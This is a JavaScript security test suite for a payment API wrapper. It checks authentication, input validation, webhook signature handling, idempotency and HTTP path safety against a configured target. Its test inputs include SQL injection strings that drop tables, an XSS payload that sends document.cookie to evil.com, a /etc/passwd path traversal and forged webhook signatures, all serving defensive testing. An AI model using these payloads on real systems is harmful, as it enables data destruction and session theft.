import { strict as assert } from "node:assert"
import {
  FAWRY_HEADERS,
  PAYMOB_DUMMY_HEADERS,
  STRIPE_DUMMY_HEADERS,
  hasPaymobCredentials,
  hasStripeCredentials,
  paymobHeadersFromEnv,
  stripeHeadersFromEnv,
} from "../lib/provider-test-credentials.mjs"

const BASE_URL = process.env.TARGET_URL
if (!BASE_URL) {
  console.error("TARGET_URL is required (e.g. http://localhost:8080)")
  process.exit(1)
}
const VALID_API_KEY = process.env.API_KEY
if (!VALID_API_KEY) {
  console.error("API_KEY is required for security tests")
  process.exit(1)
}

let passed = 0
let failed = 0
let skipped = 0

async function runTest(name, fn) {
  process.stdout.write(`🛡️  ${name.padEnd(65, ".")} `)
  try {
    await fn()
    console.log("[\x1b[32mPASS\x1b[0m]")
    passed++
  } catch (err) {
    console.log("[\x1b[31mFAIL\x1b[0m]")
    console.error(`   👉 ${err.message}`)
    failed++
  }
}

async function runOptionalTest(name, hasCredentials, fn) {
  if (!hasCredentials()) {
    process.stdout.write(`🛡️  ${name.padEnd(65, ".")} `)
    console.log("[\x1b[33mSKIP\x1b[0m] (set provider env vars to enable)")
    skipped++
    return
  }
  await runTest(name, fn)
}

async function startSuite() {
  console.log("\n════════════════════════════════════════════════════════════════════")
  console.log("🔒 OpenWrapper Advanced Security & Defensive Architecture Suite")
  console.log(`🎯 Target: ${BASE_URL}`)
  console.log("════════════════════════════════════════════════════════════════════\n")

  // ─────────────────────────────────────────────────────────────────
  // Category 1: Authentication & Authorization
  // ─────────────────────────────────────────────────────────────────
  console.log("── 🔐 Authentication & Authorization ──────────────────────────────\n")

  await runTest("AUTH-01  No Authorization header → 401", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Idempotency-Key": "sec-auth-01" },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 401)
  })

  await runTest("AUTH-02  Forged API key → 401", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer ow_live_FAKE_attacker_xyz987654321",
        "Idempotency-Key": "sec-auth-02",
      },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 401)
  })

  await runTest("AUTH-03  Empty Bearer token → 401", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer ",
        "Idempotency-Key": "sec-auth-03",
      },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 401)
  })

  await runTest("AUTH-04  Bearer with SQL injection payload → 401", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer ' OR '1'='1'; DROP TABLE api_keys;--",
        "Idempotency-Key": "sec-auth-04",
      },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 401)
  })

  await runTest("AUTH-05  Basic auth scheme (wrong scheme) → 401", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Basic dXNlcjpwYXNz",
        "Idempotency-Key": "sec-auth-05",
      },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 401)
  })

  // ─────────────────────────────────────────────────────────────────
  // Category 2: Input Validation & Schema Enforcement
  // ─────────────────────────────────────────────────────────────────
  console.log("\n── 🧪 Input Validation & Schema Enforcement ───────────────────────\n")

  await runTest("VALID-01  Missing Idempotency-Key → 400", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${VALID_API_KEY}` },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: 1000, customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 400)
    const json = await res.json()
    assert.equal(json.error?.code, "invalid_request")
  })

  await runTest("VALID-02  Missing provider credentials → 422", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-valid-02-${Date.now()}`,
      },
      body: JSON.stringify({ provider: "paymob", amount_minor_units: 10000, currency: "EGP", customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 422)
    const json = await res.json()
    assert.equal(json.error?.code, "missing_provider_credentials")
  })

  await runTest("VALID-03  Unsupported provider → 422", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-valid-03-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({ provider: "paypal", amount_minor_units: 1000, currency: "EGP", customer: { phone: "+201000000000" } }),
    })
    assert.equal(res.status, 422)
  })

  await runTest("VALID-04  Negative amount → 400 or 422", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-valid-04-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({ provider: "fawry", amount_minor_units: -500, currency: "EGP", customer: { phone: "+201000000000" } }),
    })
    assert.ok([400, 422].includes(res.status), `Expected 400/422, got ${res.status}`)
  })

  await runTest("VALID-05  Empty JSON body → 400", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-valid-05-${Date.now()}`,
      },
      body: "{}",
    })
    assert.ok([400, 422].includes(res.status), `Expected 400/422, got ${res.status}`)
  })

  // ─────────────────────────────────────────────────────────────────
  // Category 3: SQL Injection & XSS Resistance
  // ─────────────────────────────────────────────────────────────────
  console.log("\n── 💉 Injection Resistance (SQL / XSS / NoSQL) ────────────────────\n")

  await runTest("INJECT-01  SQL injection in email field", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-sqli-01-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({
        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
        customer: { phone: "+201000000000", email: "admin' OR '1'='1'; DROP TABLE payments;--@test.com", full_name: "SQLi Test" },
        merchant_reference: `sqli_${Date.now()}`,
      }),
    })
    assert.ok([200, 201, 400, 422, 502].includes(res.status), `Got ${res.status}`)
  })

  await runTest("INJECT-02  SQL injection in merchant_reference", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-sqli-02-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({
        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
        customer: { phone: "+201000000000" },
        merchant_reference: "'; DROP TABLE api_keys; SELECT * FROM users WHERE '1'='1",
      }),
    })
    assert.ok([200, 201, 400, 422, 502].includes(res.status), `Got ${res.status}`)
  })

  await runTest("INJECT-03  XSS in description field", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-xss-03-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({
        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
        customer: { phone: "+201000000000" },
        merchant_reference: `xss_${Date.now()}`,
        description: '<script>alert("XSS")</script><img onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)" src=x>',
      }),
    })
    assert.ok([200, 201, 400, 422, 502].includes(res.status), `Got ${res.status}`)
    if (res.status === 200 || res.status === 201) {
      const body = await res.text()
      assert.ok(!body.includes("<script>"), "Response must not reflect raw script tags")
    }
  })

  await runTest("INJECT-04  Unicode/null byte injection in full_name", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-null-04-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({
        provider: "fawry", amount_minor_units: 15000, currency: "EGP",
        customer: { phone: "+201000000000", full_name: "Test\x00User\x00DROP\x00TABLE" },
        merchant_reference: `null_${Date.now()}`,
      }),
    })
    assert.ok(res.status < 502, `Server must not crash: got ${res.status}`)
  })

  // ─────────────────────────────────────────────────────────────────
  // Category 3b: Provider integration (staging)
  // ─────────────────────────────────────────────────────────────────
  console.log("\n── 🏦 Provider Integration (staging) ────────────────────────────────\n")

  await runTest("PROV-01  Fawry staging payment → payment_id", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-01-${Date.now()}`,
        ...FAWRY_HEADERS,
      },
      body: JSON.stringify({
        provider: "fawry",
        amount_minor_units: 5000,
        currency: "EGP",
        customer: { phone: "+201000000000" },
        merchant_reference: `prov_${Date.now()}`,
      }),
    })
    assert.ok([200, 201].includes(res.status), `Expected 200/201, got ${res.status}`)
    const json = await res.json()
    assert.ok(json.payment_id, "Expected payment_id in response")
  })

  await runTest("PROV-02  Paymob without credentials → 422", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-02-${Date.now()}`,
      },
      body: JSON.stringify({
        provider: "paymob",
        amount_minor_units: 10000,
        currency: "EGP",
        customer: { phone: "+201000000000" },
      }),
    })
    assert.equal(res.status, 422)
    const json = await res.json()
    assert.equal(json.error?.code, "missing_provider_credentials")
  })

  await runTest("PROV-03  Paymob dummy credentials → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-03-${Date.now()}`,
        ...PAYMOB_DUMMY_HEADERS,
      },
      body: JSON.stringify({
        provider: "paymob",
        amount_minor_units: 10000,
        currency: "EGP",
        customer: { phone: "+201000000000" },
      }),
    })
    assert.ok(res.status !== 500, `Server must not return 500, got ${res.status}`)
  })

  await runTest("PROV-04  Stripe without credentials → 422", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-04-${Date.now()}`,
      },
      body: JSON.stringify({
        provider: "stripe",
        amount_minor_units: 1000,
        currency: "USD",
        customer: { phone: "+201000000000", email: "stripe@test.com" },
        return_url: "https://example.com/payment/success",
      }),
    })
    assert.equal(res.status, 422)
    const json = await res.json()
    assert.equal(json.error?.code, "missing_provider_credentials")
  })

  await runTest("PROV-05  Stripe dummy credentials → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-05-${Date.now()}`,
        ...STRIPE_DUMMY_HEADERS,
      },
      body: JSON.stringify({
        provider: "stripe",
        amount_minor_units: 1000,
        currency: "USD",
        customer: { phone: "+201000000000", email: "stripe@test.com" },
        return_url: "https://example.com/payment/success",
      }),
    })
    assert.ok(res.status !== 500, `Server must not return 500, got ${res.status}`)
  })

  await runOptionalTest("PROV-06  Paymob live payment → payment_id", hasPaymobCredentials, async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-06-${Date.now()}`,
        ...paymobHeadersFromEnv(),
      },
      body: JSON.stringify({
        provider: "paymob",
        amount_minor_units: 10000,
        currency: "EGP",
        customer: { phone: "+201000000000", email: "paymob@test.com" },
        merchant_reference: `paymob_${Date.now()}`,
      }),
    })
    assert.ok([200, 201].includes(res.status), `Expected 200/201, got ${res.status}`)
    const json = await res.json()
    assert.ok(json.payment_id, "Expected payment_id in response")
  })

  await runOptionalTest("PROV-07  Stripe live payment → payment_id", hasStripeCredentials, async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-prov-07-${Date.now()}`,
        ...stripeHeadersFromEnv(),
      },
      body: JSON.stringify({
        provider: "stripe",
        amount_minor_units: 1000,
        currency: "USD",
        customer: { phone: "+201000000000", email: "stripe-live@test.com" },
        return_url: "https://example.com/payment/success",
        merchant_reference: `stripe_${Date.now()}`,
      }),
    })
    assert.ok([200, 201].includes(res.status), `Expected 200/201, got ${res.status}`)
    const json = await res.json()
    assert.ok(json.payment_id, "Expected payment_id in response")
    assert.ok(json.next_action?.url || json.next_action?.type, "Expected Stripe checkout next_action")
  })

  // ─────────────────────────────────────────────────────────────────
  // Category 4: Webhook Security
  // ─────────────────────────────────────────────────────────────────
  console.log("\n── 🪝 Webhook Security ────────────────────────────────────────────\n")

  await runTest("WEBHOOK-01  Fawry forged signature → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/fawry`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        fawryRefNumber: "987654321", merchantRefNumber: "ord_1001",
        paymentAmount: "150.00", orderStatus: "PAID",
        messageSignature: "forged_invalid_000000000000000000000000",
      }),
    })
    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
  })

  await runTest("WEBHOOK-02  Stripe forged signature → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "stripe-signature": "t=1600000000,v1=forged_invalid_stripe_signature_hash",
      },
      body: JSON.stringify({
        id: "evt_fake_test", type: "checkout.session.completed",
        data: { object: { id: "cs_fake", payment_status: "paid" } },
      }),
    })
    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
  })

  await runTest("WEBHOOK-03  Stripe empty body → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "",
    })
    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
  })

  await runTest("WEBHOOK-04  Stripe malformed JSON → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{not valid json!!!",
    })
    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
  })

  await runTest("WEBHOOK-05  Stripe missing data.object → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/stripe`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: "evt_no_data", type: "checkout.session.completed" }),
    })
    assert.ok(res.status < 500, `Expected < 500, got ${res.status}`)
  })

  await runTest("WEBHOOK-06  Unknown webhook provider → 400", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/bitcoin`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ test: true }),
    })
    assert.equal(res.status, 400)
  })

  await runTest("WEBHOOK-07  Paymob forged HMAC → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/webhooks/paymob`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-paymob-hmac": "forged_invalid_hmac" },
      body: JSON.stringify({
        type: "TRANSACTION",
        obj: {
          id: 999999,
          success: true,
          amount_cents: 10000,
          currency: "EGP",
          order: { merchant_order_id: `ord_forged_${Date.now()}` },
        },
      }),
    })
    assert.ok([401, 503].includes(res.status) || res.status < 500, `Expected graceful rejection, got ${res.status}`)
  })
  // ─────────────────────────────────────────────────────────────────
  console.log("\n── 🔄 Idempotency & Concurrency Safety ────────────────────────────\n")

  await runTest("IDEM-01  Same idempotency key → identical payment_id", async () => {
    const key = `sec-idem-01-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
    const headers = {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${VALID_API_KEY}`,
      "Idempotency-Key": key,
      ...FAWRY_HEADERS,
    }
    const body = JSON.stringify({
      provider: "fawry", amount_minor_units: 5000, currency: "EGP",
      customer: { phone: "+201000000000", email: "idem@test.com" },
      merchant_reference: `idem_${Date.now()}`,
    })

    const res1 = await fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body })
    assert.ok([200, 201].includes(res1.status), `First request failed: ${res1.status}`)
    const json1 = await res1.json()
    const res2 = await fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body })
    assert.ok([200, 201].includes(res2.status), `Second request failed: ${res2.status}`)
    const json2 = await res2.json()

    assert.equal(json1.payment_id, json2.payment_id, "Payment IDs must match")
  })

  await runTest("IDEM-02  Concurrent parallel requests → no duplicates", async () => {
    const key = `sec-idem-02-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
    const headers = {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${VALID_API_KEY}`,
      "Idempotency-Key": key,
      ...FAWRY_HEADERS,
    }
    const body = JSON.stringify({
      provider: "fawry", amount_minor_units: 7500, currency: "EGP",
      customer: { phone: "+201000000000" },
      merchant_reference: `parallel_${Date.now()}`,
    })

    // Fire 5 requests in parallel
    const results = await Promise.all(
      Array.from({ length: 5 }, () =>
        fetch(`${BASE_URL}/api/v1/payments`, { method: "POST", headers, body }).then(r => r.json())
      )
    )

    const ids = results.filter(r => r.payment_id).map(r => r.payment_id)
    const uniqueIds = [...new Set(ids)]
    assert.equal(uniqueIds.length, 1, `Expected 1 unique payment ID, got ${uniqueIds.length}: ${JSON.stringify(uniqueIds)}`)
  })

  // ─────────────────────────────────────────────────────────────────
  // Category 6: HTTP Method & Path Security
  // ─────────────────────────────────────────────────────────────────
  console.log("\n── 🛤️  HTTP Method & Path Security ─────────────────────────────────\n")

  await runTest("HTTP-01  GET /api/v1/payments → rejected (auth-first)", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, { method: "GET" })
    assert.ok([401, 404, 405].includes(res.status), `Expected 401/404/405, got ${res.status}`)
  })

  await runTest("HTTP-02  DELETE /api/v1/payments → 405", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/payments`, { method: "DELETE" })
    assert.ok([404, 405].includes(res.status), `Expected 404/405, got ${res.status}`)
  })

  await runTest("HTTP-03  Path traversal attempt → no 500", async () => {
    const res = await fetch(`${BASE_URL}/api/v1/../../../etc/passwd`)
    assert.ok(res.status < 500, `Got ${res.status}`)
  })

  await runTest("HTTP-04  Oversized payload (1MB) → rejection", async () => {
    const bigPayload = JSON.stringify({ data: "x".repeat(1024 * 1024) })
    const res = await fetch(`${BASE_URL}/api/v1/payments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${VALID_API_KEY}`,
        "Idempotency-Key": `sec-big-${Date.now()}`,
      },
      body: bigPayload,
    })
    assert.ok([400, 413, 422].includes(res.status), `Expected 400/413/422, got ${res.status}`)
  })

  // ─────────────────────────────────────────────────────────────────
  // Summary
  // ─────────────────────────────────────────────────────────────────
  console.log("\n════════════════════════════════════════════════════════════════════")
  const skipNote = skipped > 0 ? `, \x1b[33m${skipped} Skipped\x1b[0m` : ""
  console.log(`📊 Security Test Summary: \x1b[32m${passed} Passed\x1b[0m, \x1b[31m${failed} Failed\x1b[0m${skipNote} (${passed + failed + skipped} total)`)
  console.log("════════════════════════════════════════════════════════════════════\n")
  if (failed > 0) process.exit(1)
}

startSuite().catch((err) => {
  console.error("Fatal test runner error:", err)
  process.exit(1)
})
